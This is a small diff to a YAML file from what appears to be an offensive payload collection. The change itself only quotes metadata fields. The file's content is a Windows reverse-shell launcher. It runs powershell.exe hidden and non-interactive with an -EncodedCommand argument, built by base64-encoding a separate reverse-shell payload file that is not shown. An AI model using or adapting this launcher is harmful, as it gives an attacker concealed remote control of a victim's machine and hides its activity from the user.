@@ -1,9 +1,9 @@
 ---
 metadata:
-  filename: revshell-windows-powershell-oneliner-base64encoded.yaml
+  filename: "revshell-windows-powershell-oneliner-base64encoded.yaml"
   tags: ["shell", "windows"]
   created: "2025-03-29"
-  author: Unknown
+  author: "Unknown"
 
 content: |
   powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand {{ include('payloads/revshell-windows-powershell-oneliner.yaml') | base64_pwsh }}
